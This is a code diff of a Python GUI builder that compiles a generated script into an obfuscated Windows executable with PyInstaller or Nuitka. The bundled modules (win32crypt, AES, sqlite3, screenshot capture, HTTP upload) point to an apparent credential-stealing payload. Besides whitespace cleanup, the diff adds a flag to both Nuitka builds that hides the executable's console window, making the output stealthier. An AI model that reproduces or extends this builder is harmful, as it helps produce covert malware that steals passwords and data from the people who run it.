@@ -485,9 +485,9 @@ class App(customtkinter.CTk):
                                 "--hidden-import", "win32crypt",
                                 "--icon", exeicon, f"./{filename}.py"]
                                )
-    
+
                 logging.info(f"Successfully compiled {filename}.exe with pyinstaller")
-                
+
             if filetype == "nuitka":
                 if sys.version_info[:2] > (3, 11):
                     print("Nuitka does not support Python 3.12")
@@ -500,12 +500,12 @@ class App(customtkinter.CTk):
                             subprocess.run([
                                 "./.venv/Scripts/python", "-m", "nuitka",
                                 "--onefile", "--standalone", "--remove-output",
-                                "--show-progress", "--prefer-source-code", 
+                                "--show-progress", "--prefer-source-code",
                                 "--include-module=concurrent.futures", "--include-module=PIL.ImageGrab",
                                 "--include-module=sqlite3", "--include-module=psutil",
                                 "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
-                                "--include-module=requests_toolbelt", "--include-module=win32crypt",                                
-                                "--assume-yes-for-downloads",
+                                "--include-module=requests_toolbelt", "--include-module=win32crypt",
+                                "--assume-yes-for-downloads", "--windows-disable-console",
                                 f"--windows-icon-from-ico={exeicon}",
                                 f"./{filename}.py"
                             ])
@@ -519,13 +519,13 @@ class App(customtkinter.CTk):
                                 "--include-module=sqlite3", "--include-module=psutil",
                                 "--include-module=requests", "--include-module=Cryptodome.Cipher.AES",
                                 "--include-module=requests_toolbelt", "--include-module=win32crypt",
-                                "--assume-yes-for-downloads",
+                                "--assume-yes-for-downloads", "--windows-disable-console",
                                 f"./{filename}.py"
                             ])
-                        logging.info(f"Successfully compiled {filename}.exe with nuitka")    
+                        logging.info(f"Successfully compiled {filename}.exe with nuitka")
                     except Exception as e:
                         logging.error(f"Error with compiling file: {e}")
-                
+
         except Exception as e:
             logging.error(f"Error with compiling file: {e}")
 
@@ -591,7 +591,7 @@ class App(customtkinter.CTk):
                 self.built_file()
                 self.builder_frame.after(3000, self.reset_build_button)
                 self.cleanup_files(filename)
-                
+
             elif self.get_filetype() == "nuitka":
                 self.write_and_obfuscate(filename)
 
